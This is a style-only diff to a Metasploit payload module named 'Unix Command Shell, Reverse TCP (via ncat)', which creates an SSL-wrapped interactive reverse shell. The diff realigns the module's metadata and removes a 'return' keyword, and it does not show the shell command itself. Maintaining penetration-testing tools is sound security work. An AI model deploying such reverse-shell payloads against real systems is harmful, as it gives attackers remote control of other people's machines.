@@ -16,17 +16,17 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Reverse TCP (via ncat)',
-      'Description'   => 'Creates an interactive shell via ncat, utilising ssl mode',
-      'Author'        => 'C_Sto',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcpSsl,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'ncat',
-      'Payload'       =>
+      'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
+      'Description' => 'Creates an interactive shell via ncat, utilising ssl mode',
+      'Author'      => 'C_Sto',
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'unix',
+      'Arch'        => ARCH_CMD,
+      'Handler'     => Msf::Handler::ReverseTcpSsl,
+      'Session'     => Msf::Sessions::CommandShell,
+      'PayloadType' => 'cmd',
+      'RequiredCmd' => 'ncat',
+      'Payload'     =>
         {
           'Offsets' => { },
           'Payload' => ''
@@ -38,7 +38,7 @@ module MetasploitModule
   # Constructs the payload
   #
   def generate
-    return super + command_string
+    super + command_string
   end
 
   #
